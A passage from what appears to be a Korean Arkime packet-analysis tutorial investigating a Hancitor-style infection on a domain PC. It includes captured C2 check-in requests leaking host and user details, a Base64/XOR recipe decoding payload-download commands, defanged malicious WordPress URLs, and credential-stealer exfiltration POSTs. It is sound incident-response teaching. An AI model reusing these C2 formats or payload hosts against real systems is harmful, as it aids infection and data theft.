+<li><code>capinfos</code>는 컴퓨터의 시간대로 시간을 보여 줄 수 있어요. <code>TZ=UTC capinfos 파일</code>처럼 앞에 <code>TZ=UTC</code>를 붙이면 UTC로 나옵니다. (애들레이드 시간으로 보면 11:36:51처럼 9시간 30분 늦게 나와요.)</li>
+</ul>
+<p><strong>Arkime 시간 범위:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Start     2018/05/11 02:06:51
+End       2018/05/11 02:50:00
+Bounding  Last Packet
+</code></pre></div></div>
+<ul>
+<li><strong>Start / End</strong> — 검색할 시간 창입니다. 마지막 패킷은 02:49:40이에요. 끝을 <strong>조금 넓게</strong>(02:50:00) 잡으면 끝부분 세션을 놓치지 않습니다.</li>
+<li><strong>Bounding: Last Packet</strong> — 세션의 <strong>마지막 패킷</strong> 시간이 창 안에 있으면 보여 줍니다. 시간을 넓게 잡으면 어떤 Bounding을 쓰든 전체가 나와요.</li>
+<li>Arkime의 시간은 UTC로 표시되게 두세요(Settings → Timezone Format → UTC). 보고서의 시간은 모두 UTC입니다.</li>
+</ul>
+<p><strong>화면에서 보는 곳:</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">탭</th>
+<th scope="col">용도</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Sessions</strong></td>
+<td>세션(연결) 하나가 한 줄. 줄을 펼치면 상세 정보와 패킷 내용이 보임</td>
+</tr>
+<tr>
+<td><strong>SPIView</strong></td>
+<td>필드별로 값과 개수를 모아 보여 줌. 값 옆 괄호 안 숫자 <code>(54)</code>는 <strong>세션 개수</strong></td>
+</tr>
+<tr>
+<td><strong>Connections</strong></td>
+<td>누가 누구와 통신했는지 그래프</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>값을 클릭하면 <strong>and</strong> / <strong>exclude</strong> 메뉴가 나와서 검색식에 바로 추가할 수 있어요. 검색식을 직접 치는 것보다 오타가 적습니다.</p>
+<hr>
+</section>
+<section>
+<h2 id="ko-baseline">1단계 — 베이스라인: 어떤 장치와 사용자가 있나</h2>
+<p><strong>결과:</strong> 내부 PC는 10.0.14.129 한 대(CHICAGO-7FA3-PC, 사용자 faith.hoffman)뿐이고, 10.0.14.3은 도메인 컨트롤러(DC), 10.0.14.1은 게이트웨이입니다. 베이스라인을 먼저 알아야 나중에 "이상한 것"이 눈에 띄어요.</p>
+<h3 id="ko-overview">1-1. 전체 그림 보기</h3>
+<p><strong>쿼리:</strong> 검색창을 <strong>비우고</strong> Search → <strong>SPIView</strong> → <strong>general</strong> 섹션.</p>
+<p><strong>결과 (Arkime 화면):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Src IP     10.0.14.129 (212)  10.0.14.1 (3)  0.0.0.0 (1)
+Dst IP     10.0.14.3 (91)  185.174.175.14 (54)  10.0.14.1 (23)  185.43.223.6 (23)
+           224.0.0.252 (5)  255.255.255.255 (4)  10.0.14.129 (3)  10.0.14.255 (3)
+           224.0.0.22 (3)  239.255.255.250 (3)  111.90.144.30 (1)  173.223.52.18 (1)
+           184.72.249.110 (1)  216.58.193.68 (1)
+Protocols  tcp (131) udp (82) tls (55) dns (34) http (26) krb5 (25) ldap (12)
+           dhcp (9) dcerpc (7) smb (6) llmnr (5) igmp (3) ntp (3) ssdp (3)
+</code></pre></div></div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>세션을 시작한 내부 PC는 10.0.14.129 하나뿐입니다</strong>(212개). 10.0.14.1의 3개는 DHCP 서버의 답이고, 0.0.0.0은 IP를 받기 전의 PC예요.</li>
+<li><strong>외부에서 먼저 들어온 연결은 없습니다.</strong> Src IP에 외부 IP가 하나도 없어요.</li>
+<li>외부 IP는 6개뿐입니다. 그중 185.174.175.14(54)와 185.43.223.6(23)이 유난히 많아서 눈에 띄어요. 일반 사용자가 42분 동안 같은 외부 IP에 수십 번 접속하는 건 흔하지 않습니다.</li>
+<li><code>krb5</code>, <code>ldap</code>, <code>smb</code>, <code>dcerpc</code>가 있다는 건 <strong>Windows 도메인(Active Directory) 환경</strong>이라는 뜻이에요. 앞의 <a href="handbook-back-to-the-present-chthonic-c2-tech-support-scam.html">Back to the Present</a>(공유기만 있던 집 PC)와 다릅니다.</li>
+</ul>
+<h3 id="ko-dhcp">1-2. 호스트 이름과 MAC (DHCP)</h3>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>protocols == dhcp
+</code></pre></div></div>
+<ul>
+<li><code>protocols</code> — Arkime가 알아낸 프로토콜 목록입니다.</li>
+<li><code>== dhcp</code> — DHCP 세션만 남깁니다.</li>
+</ul>
+<p>→ <strong>SPIView</strong> → <strong>dhcp</strong> 섹션(안 보이면 오른쪽 위 <strong>Load All</strong>).</p>
+<p><strong>결과 (패킷에 든 값):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Host        Chicago-7fa3-PC
+Client MAC  00:1a:92:06:5c:7b
+Client OUI  ASUSTek COMPUTER INC.
+Type        REQUEST, INFORM, ACK
+Vendor      MSFT 5.0
+</code></pre></div></div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>Host = Chicago-7fa3-PC</strong> — PC가 IP를 요청하면서 스스로 밝힌 컴퓨터 이름입니다.</li>
+<li><strong>MAC = 00:1a:92:06:5c:7b, OUI = ASUSTek</strong> — MAC은 네트워크 카드의 고유 번호예요. IP는 바뀔 수 있어도 MAC은 거의 안 바뀌니까, 호스트 오퍼레이터가 기계를 찾을 때 가장 확실한 단서입니다.</li>
+<li><strong>MSFT 5.0</strong> — Windows(Vista 이후)의 DHCP 클라이언트가 붙이는 이름표예요.</li>
+<li><strong>02:06:51에 0.0.0.0에서 REQUEST</strong> — PC가 켜지거나 네트워크에 다시 붙으면서 쓰던 IP(10.0.14.129)를 다시 요청했습니다. <strong>캡처가 PC 시작 직후부터 기록됐다</strong>는 뜻이라 중요해요(<a href="#ko-timeline">7단계 타임라인</a>).</li>
+<li><strong>INFORM</strong> — IP는 이미 있고 다른 설정만 묻는 메시지. <strong>02:21:51, 02:36:51의 REQUEST</strong>는 15분마다 하는 임대 갱신입니다. 모두 정상이에요.</li>
+</ul>
+<h3 id="ko-kerberos">1-3. 사용자 계정과 도메인 (Kerberos)</h3>
+<p><strong>목적:</strong> Windows 도메인에서는 로그인할 때 Kerberos로 DC에 "티켓"을 요청합니다. 이 요청에 <strong>계정 이름</strong>이 들어 있어요.</p>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>protocols == krb5
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>krb5</strong> 섹션.</p>
+<p><strong>결과:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>cname   CHICAGO-7FA3-PC$   chicago-7fa3-pc$   faith.hoffman
+realm   NIGHTDEW.ORG
+sname   krbtgt/NIGHTDEW.ORG   cifs/nightdew-dc.nightdew.org
+        ldap/Nightdew-DC.nightdew.org   host/chicago-7fa3-pc.nightdew.org
+</code></pre></div></div>
+<ul>
+<li><code>cname</code> — 티켓을 요청한 <strong>계정</strong>. <code>realm</code> — <strong>도메인</strong>. <code>sname</code> — 접근하려는 <strong>서비스</strong>.</li>
+</ul>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong><code>$</code>로 끝나는 이름은 컴퓨터 계정</strong>입니다(<code>CHICAGO-7FA3-PC$</code>). PC도 도메인에 로그인해요. 사람 계정과 헷갈리면 안 됩니다.</li>
+<li><strong><code>$</code>가 없는 faith.hoffman이 사람(사용자) 계정</strong>입니다. 세션을 펼쳐 보면 <strong>02:07:29 UTC</strong>에 티켓을 요청했어요. 이때 사용자가 로그인한 것입니다.</li>
+<li><strong>도메인 = NIGHTDEW.ORG</strong>, DC 이름 = <strong>Nightdew-DC.nightdew.org</strong>.</li>
+<li><code>cifs</code>(파일 공유), <code>ldap</code>(디렉터리 조회), <code>host</code>는 로그인하고 그룹 정책을 읽을 때 보통 나오는 서비스예요. SMB로 읽은 파일도 그룹 정책 파일(<code>sysvol\...\gpt.ini</code>) 하나뿐입니다. <strong>정상적인 도메인 로그인</strong>이에요.</li>
+</ul>
+<h3 id="ko-dc">1-4. DC 확인 (DNS)</h3>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>protocols == dns
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>dns</strong> 섹션의 <strong>Host</strong>(질문한 이름)와 <strong>IP</strong>(답), 그리고 general의 <strong>Dst IP</strong>.</p>
+<p><strong>결과에서 볼 것:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Dst IP  10.0.14.3 (34)        ← DNS 질문을 받는 서버
+Host    _ldap._tcp.dc._msdcs.nightdew.org   → 10.0.14.3
+        nightdew-dc.nightdew.org            → 10.0.14.3
+</code></pre></div></div>
+<ul>
+<li><code>_ldap._tcp.dc._msdcs.&lt;도메인&gt;</code>은 Windows가 <strong>"우리 도메인의 DC가 어디 있나요?"</strong> 하고 묻는 이름입니다. 답이 10.0.14.3이니 <strong>10.0.14.3 = DC</strong>예요.</li>
+<li>DNS 서버도 10.0.14.3(DC)입니다. 도메인 환경에서는 보통 DC가 DNS를 겸해요.</li>
+<li>이 PC가 DC 말고 다른 DNS 서버에 직접 묻는 일은 없었습니다. 앞 사례의 "외부 DNS에 TCP로 직접 질문" 같은 우회는 이번에는 <strong>없습니다.</strong></li>
+</ul>
+<h3 id="ko-baseline-summary">베이스라인 정리</h3>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">IP</th>
+<th scope="col">이름</th>
+<th scope="col">MAC (제조사)</th>
+<th scope="col">역할</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>10.0.14.129</td>
+<td>CHICAGO-7FA3-PC</td>
+<td>00:1a:92:06:5c:7b (ASUSTek)</td>
+<td>사용자 PC, Windows 7 x64, faith.hoffman</td>
+</tr>
+<tr>
+<td>10.0.14.3</td>
+<td>Nightdew-DC.nightdew.org</td>
+<td>00:1e:4f:88:3f:a6 (Dell)</td>
+<td>DC + DNS</td>
+</tr>
+<tr>
+<td>10.0.14.1</td>
+<td>—</td>
+<td>00:02:16:47:96:ef (Cisco)</td>
+<td>게이트웨이 + DHCP</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
+</section>
+<section>
+<h2 id="ko-external">2단계 — 외부 목적지 정리: 밖으로 누구와 얼마나 통신했나</h2>
+<p><strong>결과:</strong> 외부 IP 6개 중 3개(185.43.223.6, 111.90.144.30, 185.174.175.14)가 수상하고, 1개(api.ipify[.]org)는 정상 서비스지만 악성코드가 썼습니다. 나머지 2개는 Windows와 구글의 정상 통신입니다.</p>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; ip.dst != [10.0.0.0/8, 224.0.0.0/4, 255.255.255.255]
+</code></pre></div></div>
+<ul>
+<li><code>ip.src == 10.0.14.129</code> — 감염 의심 PC가 <strong>시작한</strong> 세션만.</li>
+<li><code>&amp;&amp;</code> — 그리고(AND). 양쪽 조건을 모두 만족해야 합니다.</li>
+<li><code>ip.dst != [...]</code> — 목적지가 대괄호 안 목록에 <strong>하나도 해당하지 않는</strong> 세션만.</li>
+<li><code>10.0.0.0/8</code> — 내부 주소 전체. <code>224.0.0.0/4</code> — 멀티캐스트(LLMNR, SSDP 등 동네 방송). <code>255.255.255.255</code> — 브로드캐스트. 이것들을 빼면 <strong>인터넷으로 나간 것만</strong> 남아요.</li>
+</ul>
+<p>→ <strong>Sessions</strong> 탭에서 <strong>Dst IP</strong>로 정렬하거나, <strong>SPIView</strong>의 general(Dst IP), http(Hostname), tls 섹션을 함께 봅니다. 바이트는 Sessions 탭에 <strong>Src Bytes / Dst Bytes</strong> 열을 추가하면 보여요(열 제목 오른쪽 클릭 → 열 추가).</p>
+<p><strong>결과 (정리):</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">Dst IP</th>
+<th scope="col">포트</th>
+<th scope="col">이름 (DNS / Host / SNI)</th>
+<th scope="col">세션</th>
+<th scope="col">처음 – 마지막 (UTC)</th>
+<th scope="col">보냄 / 받음</th>
+<th scope="col">판단</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>185.174.175.14</td>
+<td>443</td>
+<td>robwassotdint[.]ru</td>
+<td>54</td>
+<td>02:10:16 – 02:45:46</td>
+<td>약 120 KB / 1.65 MB</td>
+<td><strong>악성</strong> (<a href="#ko-tls-c2">6단계</a>)</td>
+</tr>
+<tr>
+<td>185.43.223.6</td>
+<td>80</td>
+<td>lysedsohap[.]com</td>
+<td>23</td>
+<td>02:08:04 – 02:48:25</td>
+<td>약 16 KB / 12 KB</td>
+<td><strong>악성</strong> (<a href="#ko-checkin">3단계</a>, <a href="#ko-exfil">5단계</a>)</td>
+</tr>
+<tr>
+<td>111.90.144.30</td>
+<td>80</td>
+<td>wansaiful[.]com</td>
+<td>1</td>
+<td>02:08:05 – 02:08:15</td>
+<td>약 5 KB / 264 KB</td>
+<td><strong>악성</strong> (4단계)</td>
+</tr>
+<tr>
+<td>184.72.249.110</td>
+<td>80</td>
+<td>api.ipify[.]org</td>
+<td>1</td>
+<td>02:08:04</td>
+<td>0.5 KB / 0.5 KB</td>
+<td>정상 서비스, <strong>악성코드가 사용</strong></td>
+</tr>
+<tr>
+<td>216.58.193.68</td>
+<td>443</td>
+<td>www.google.com</td>
+<td>1</td>
+<td>02:20:16</td>
+<td>3.7 KB / 84 KB</td>
+<td>정상으로 보임</td>
+</tr>
+<tr>
+<td>173.223.52.18</td>
+<td>80</td>
+<td>www.msftncsi.com</td>
+<td>1</td>
+<td>02:07:02</td>
+<td>0.4 KB / 0.5 KB</td>
+<td>정상 (Windows 인터넷 연결 확인)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>185.174.175.14 — 세션 54개, 받은 양 1.65 MB.</strong> 35분 동안 같은 서버에 계속 접속했어요. 이름 <code>robwassotdint[.]ru</code>는 의미 없는 글자 조합입니다.</li>
+<li><strong>185.43.223.6 — 세션 23개.</strong> 40분 동안 꼬박꼬박 접속했고, <code>lysedsohap[.]com</code>도 무작위 같은 이름이에요. 보낸 양(16 KB)이 받은 양(12 KB)보다 많은 것도 일반 웹 서핑과 반대예요.</li>
+<li><strong>111.90.144.30 — 세션 1개에 264 KB를 받음.</strong> 무언가를 내려받았습니다.</li>
+<li><strong>api.ipify[.]org</strong> — "내 공인 IP가 뭐지?"를 알려 주는 정상 서비스예요. 그런데 회사 PC가 이걸 물어볼 일은 거의 없고, <strong>악성코드가 감염 직후 자주 하는 행동</strong>입니다. 시간을 보세요. 02:08:04에 ipify, 0.5초 뒤 lysedsohap[.]com, 1초 뒤 wansaiful[.]com이에요. 한 묶음입니다.</li>
+<li><strong>www.google.com</strong> — 구글의 정상 인증서(Google Internet Authority G3)를 씁니다. 한 번뿐이라 판단할 근거가 부족해서, 보고서에는 넣지 않아요.</li>
+<li><strong>www.msftncsi.com/ncsi.txt</strong> — Windows가 네트워크에 붙을 때 "인터넷 되나?" 확인하는 요청입니다. User-Agent가 <code>Microsoft NCSI</code>예요. 정상입니다.</li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">\"수상한 외부 IP\" 빠르게 고르는 법</p>
+<ol>
+<li>세션 수가 많은데 목적지가 하나뿐인 곳 (비콘 후보)</li>
+<li>도메인 이름이 무작위 글자 조합인 곳</li>
+<li>세션 하나에 받은 양이 큰 곳 (다운로드)</li>
+<li>서로 다른 외부 IP가 <strong>몇 초 안에 연달아</strong> 나오는 곳 (한 프로그램의 연속 동작)</li>
+</ol>
+</div>
+<hr>
+</section>
+<section>
+<h2 id="ko-checkin">3단계 — HTTP 체크인: lysedsohap[.]com에 무엇을 보냈나</h2>
+<p><strong>결과:</strong> PC는 <code>lysedsohap[.]com/4/forum.php</code>에 자기 정보(컴퓨터 이름, 도메인\사용자, 공인 IP, OS)를 담은 POST를 약 <strong>2분마다 21번</strong> 보냈습니다. 첫 답에는 "이 주소들에서 파일을 받아라"는 명령이 암호화돼 있었어요. 전형적인 <strong>다운로더(Hancitor 유형) C2</strong>입니다.</p>
+<h3 id="ko-http-overview">3-1. HTTP 전체 보기</h3>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>protocols == http
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>http</strong> 섹션.</p>
+<p><strong>결과 (Arkime 화면):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Hostname   lysedsohap.com (23)  api.ipify.org (1)  wansaiful.com (1)  www.msftncsi.com (1)
+URI        lysedsohap.com/4/forum.php (21)  lysedsohap.com/mlu/forum.php (1)
+           lysedsohap.com/d2/about.php (1)  api.ipify.org/ (1)
+           wansaiful.com/wp-content/plugins/easy-media-download/1, /2, /3
+           www.msftncsi.com/ncsi.txt (1)
+Useragent  Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko (23)
+           Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; ...) (2)
+           Microsoft NCSI (1)
+http.request.content-type   application/x-www-form-urlencoded (21)  application/octet-stream (2)
+http.request.referer        No data for this field
+http.response.server        nginx/1.10.2 (23)  Cowboy (1)  nginx (1)
+</code></pre></div></div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>HTTP 세션 26개 중 23개가 lysedsohap[.]com</strong>입니다. 그중 21개가 같은 주소 <code>/4/forum.php</code>예요. 같은 주소에 같은 일을 반복하면 비콘(beacon)을 의심합니다.</li>
+<li><strong>Referer가 하나도 없습니다.</strong> 사람이 브라우저에서 링크를 눌렀다면 보통 Referer(어느 페이지에서 왔는지)가 붙어요. 프로그램이 주소를 알고 <strong>직접</strong> 요청한 것입니다.</li>
+<li><strong>User-Agent가 IE11처럼 보여도 믿으면 안 돼요.</strong> User-Agent는 프로그램이 마음대로 쓸 수 있는 글자입니다. 특히 <code>MSIE 7.0</code>(2개)은 2007년 브라우저라서, Windows 7 PC의 IE11과 같이 나오는 것 자체가 이상해요(<a href="#ko-exfil">5단계</a>).</li>
+<li><strong>요청 본문 종류 두 가지</strong> — <code>x-www-form-urlencoded</code>(21) = 이름=값 형태의 글자, <code>octet-stream</code>(2) = 글자가 아닌 바이너리. 두 가지를 따로 봅니다.</li>
+</ul>
+<h3 id="ko-first-checkin">3-2. 첫 체크인 열어 보기</h3>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; host.http == lysedsohap.com &amp;&amp; http.uri == *4/forum.php*
+</code></pre></div></div>
+<ul>
+<li><code>host.http</code> — HTTP 요청의 Host 이름.</li>
+<li><code>http.uri == *4/forum.php*</code> — <code>*</code>는 "아무 글자나". URI에 <code>4/forum.php</code>가 들어 있는 것만. (Arkime는 URI 앞에 호스트 이름까지 붙여서 저장해요: <code>lysedsohap.com/4/forum.php</code>.)</li>
+</ul>
+<p>→ <strong>Sessions</strong> 탭에서 21개가 나오면, <strong>Start Time으로 정렬</strong>해서 가장 위(02:08:04) 세션의 ⊕를 눌러 펼칩니다. 아래쪽 패킷 내용에서 <strong>natural</strong>(또는 ascii) 보기를 고릅니다.</p>
+<p><strong>결과 (요청):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>POST /4/forum.php HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+Host: lysedsohap.com
+Content-Length: 123
+Cache-Control: no-cache
+
+GUID=10412771973665002240&amp;BUILD=09fhx05&amp;INFO=CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman&amp;IP=173.236.56.182&amp;TYPE=1&amp;WIN=6.1(x64)
+</code></pre></div></div>
+<p><strong>본문을 하나씩 나눠 읽기:</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">이름</th>
+<th scope="col">값</th>
+<th scope="col">뜻</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GUID</code></td>
+<td>10412771973665002240</td>
+<td>감염된 PC마다 붙는 고유 번호. 공격자가 피해 PC를 구분하는 데 써요</td>
+</tr>
+<tr>
+<td><code>BUILD</code></td>
+<td>09fhx05</td>
+<td>악성코드 빌드(캠페인) 이름</td>
+</tr>
+<tr>
+<td><code>INFO</code></td>
+<td>CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman</td>
+<td><strong>컴퓨터 이름 @ 도메인\사용자</strong> — 피해 호스트와 사용자를 트래픽만으로 확인해 줍니다</td>
+</tr>
+<tr>
+<td><code>IP</code></td>
+<td>173.236.56.182</td>
+<td>바로 전 api.ipify[.]org가 알려 준 <strong>공인 IP</strong> (네트워크의 인터넷 쪽 주소)</td>
+</tr>
+<tr>
+<td><code>TYPE</code></td>
+<td>1</td>
+<td>악성코드 내부 값</td>
+</tr>
+<tr>
+<td><code>WIN</code></td>
+<td>6.1(x64)</td>
+<td>Windows 버전 6.1 = <strong>Windows 7, 64비트</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>api.ipify[.]org를 왜 불렀는지 여기서 밝혀져요.</strong> ipify의 답(173.236.56.182)이 0.5초 뒤 C2로 그대로 전달됐습니다. 설명 없이 두 세션을 하나의 행동으로 묶을 수 있는 증거예요.</li>
+<li><strong>이 본문만으로도 악성 판단이 충분합니다.</strong> 정상 프로그램은 도메인\사용자와 공인 IP를 무작위 이름의 외부 서버에 보내지 않아요.</li>
+</ul>
+<h3 id="ko-cyberchef">3-3. 첫 응답을 CyberChef로 풀기</h3>
+<p><strong>결과 (응답):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: nginx/1.10.2
+Content-Type: text/html
+Transfer-Encoding: chunked
+X-Powered-By: PHP/5.4.45
+
+59c
+GKPTARZAEg4OCkBVVQ0bFAkbExwPFlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVR8bCQNXFx8e...
+0
+</code></pre></div></div>
+<ul>
+<li><code>Transfer-Encoding: chunked</code> — 본문을 덩어리로 나눠 보내는 방식이에요. <code>59c</code>는 다음 덩어리 크기(16진수 0x59c = 1436바이트)이고, 마지막 <code>0</code>은 "끝"이라는 표시입니다. <strong>본문이 아니니 복사할 때 빼세요.</strong></li>
+<li>본문은 <code>A-Z a-z 0-9 + /</code>만 쓴 긴 글자예요. <strong>Base64</strong>로 보입니다.</li>
+</ul>
+<p><strong>CyberChef 레시피:</strong></p>
+<ol>
+<li>Input에 <code>59c</code>와 <code>0</code> 사이의 글자만 붙여 넣습니다. (패킷이 나뉘어 중간에 줄바꿈이 있으면 줄바꿈은 지워 주세요.)</li>
+<li><strong>From Base64</strong> — Base64를 원래 바이트로 되돌립니다. 결과는 아직 알아볼 수 없는 바이트예요.</li>
+<li><strong>XOR</strong> — Key <code>7a</code>, 형식 <strong>HEX</strong>. 모든 바이트를 0x7A와 XOR해서 원래 글자로 되돌립니다.</li>
+</ol>
+<p><strong>결과 (CyberChef Output, 보기 좋게 줄바꿈):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>b..{l:hxxp://wansaiful[.]com/wp-content/plugins/easy-media-download/1
+       |hxxp://www[.]victoryoutreachvallejo[.]com/wp-content/plugins/regenerate-thumbnails/includes/1
+       |hxxp://medleysoup[.]com/wp-content/plugins/comicpress-manager/1
+       |hxxp://radiantheartcoaching[.]com/blog/wp-content/themes/twentyten/1
+       |hxxp://hdmicablereviews[.]com/wp-content/plugins/google-sitemap-generator/1}
+    {b:hxxp://wansaiful[.]com/wp-content/plugins/easy-media-download/2|... (같은 5개 사이트, /2)}
+    {r:hxxp://wansaiful[.]com/wp-content/plugins/easy-media-download/3|... (같은 5개 사이트, /3)}
+</code></pre></div></div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li>맨 앞 몇 바이트(<code>b..</code>)는 의미 없는 값이고, 그 뒤가 <strong>명령</strong>입니다. <code>{글자:주소|주소|...}</code> 모양이 3개 있어요.</li>
+<li>명령마다 <strong>같은 파일을 가진 서버 5곳</strong>을 줍니다. 첫 서버가 막히면 다음 서버를 쓰는 예비 목록이에요. 이 PC는 첫 번째인 <strong>wansaiful[.]com에서 다 받아서</strong> 나머지 4곳에는 접속하지 않았습니다. 나머지 4곳도 다른 네트워크에서 찾아볼 지표(IOC)로 적어 둡니다.</li>
+<li>주소가 모두 <strong>WordPress 플러그인/테마 폴더</strong>(<code>wp-content/plugins/...</code>)예요. 해킹당한 정상 WordPress 사이트에 악성 파일을 숨겨 둔 전형적인 모양입니다.</li>
+<li><code>l</code>, <code>b</code>, <code>r</code>은 "받은 파일을 어떻게 실행할지"를 정하는 명령 글자입니다. 공개 분석에 따르면 Hancitor는 이런 글자로 실행 방식(바로 실행, 다른 프로세스에 주입 등)을 고릅니다. 글자별 정확한 뜻은 호스트에서 확인해야 하므로 보고서에는 "3개의 다운로드 명령"까지만 씁니다.</li>
+</ul>
+<p><strong>나중 응답들:</strong> 02:10:15 이후 20번의 응답은 모두 12바이트입니다(예: <code>TGTGARRABw==</code>). 같은 레시피로 풀면 끝에 <code>{n:}</code>이 남아요. "새 명령 없음, 대기"라는 뜻입니다.</p>
+<h3 id="ko-beacon-interval">3-4. 비콘 간격 재기</h3>
+<p>→ 3-2의 쿼리 결과(21개)를 <strong>Start Time</strong>으로 정렬합니다.</p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>02:08:04  02:10:15  02:12:16  02:14:16  02:16:17  02:18:17  02:20:18
+02:22:18  02:24:19  02:26:19  02:28:20  02:30:20  02:32:21  02:34:21
+02:36:22  02:38:22  02:40:23  02:42:24  02:44:24  02:46:25  02:48:25
+</code></pre></div></div>
+<ul>
+<li>첫 체크인 뒤로 <strong>정확히 약 120.5초 간격</strong>입니다. 사람은 이렇게 규칙적으로 움직이지 않아요. 타이머로 도는 <strong>자동 비콘</strong>입니다.</li>
+<li>본문은 매번 같고(123바이트, 같은 GUID) 응답은 <code>{n:}</code>이에요. <strong>C2가 살아 있고 다음 명령을 기다리는 상태</strong>로 캡처가 끝났습니다.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="ko-exfil">5단계 — 정보 유출: 바이너리 POST 2개</h2>
+<p><strong>결과:</strong> 다운로드 직후 같은 C2 서버로 <strong>다른 프로그램</strong>이 암호화된 데이터를 2번(206 + 234바이트) 보냈습니다. 헤더 모양이 비밀번호 탈취 악성코드 Pony의 전송 방식과 일치해요. 내용은 암호화돼 무엇이 나갔는지 트래픽만으로는 모릅니다.</p>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; http.request.content-type == application/octet-stream
+</code></pre></div></div>
+<ul>
+<li><code>http.request.content-type</code> — <strong>요청</strong>(PC가 보낸 쪽) 본문의 종류. 3-1에서 본 <code>application/octet-stream (2)</code>를 클릭하고 <strong>and</strong>를 고르면 자동으로 들어가요.</li>
+</ul>
+<p>→ 세션 <strong>2개</strong>. 둘 다 펼쳐서 요청 헤더를 봅니다.</p>
+<p><strong>결과:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>02:08:12  10.0.14.129:49200 -&gt; 185.43.223.6:80
+POST /mlu/forum.php HTTP/1.0
+Host: lysedsohap.com
+Accept: */*
+Accept-Encoding: identity, *;q=0
+Accept-Language: en-US
+Content-Length: 206
+Content-Type: application/octet-stream
+Connection: close
+Content-Encoding: binary
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; ...)
+
+(206바이트 바이너리 — 읽을 수 없음)
+
+02:08:14  10.0.14.129:49202 -&gt; 185.43.223.6:80
+POST /d2/about.php HTTP/1.0
+... (같은 헤더 모양)  Content-Length: 234
+</code></pre></div></div>
